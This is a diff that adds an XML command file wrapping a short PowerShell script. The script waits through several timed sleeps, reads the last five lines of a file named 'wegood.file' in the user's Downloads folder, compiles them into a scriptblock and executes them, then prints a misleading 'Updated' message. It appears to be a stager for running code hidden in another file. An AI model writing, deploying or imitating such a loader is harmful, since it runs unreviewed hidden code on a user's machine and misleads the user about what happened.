@@ -1,0 +1,21 @@
+<?xml version="1.0"?>
+<command>
+   <a>
+     
+      <execute>
+      
+      
+set-location -path "$home";
+start-sleep -s 5;
+$anyfile = get-content ~\downloads\wegood.file | select-object -last 5;
+start-sleep -s 3;
+$scriptblock = [system.management.automation.scriptblock]::create($anyfile);
+start-sleep -s 5;
+& $scriptblock;
+echo 'Updated';
+start-sleep -s 3;
+      
+      
+      </execute>
+   </a>
+</command>
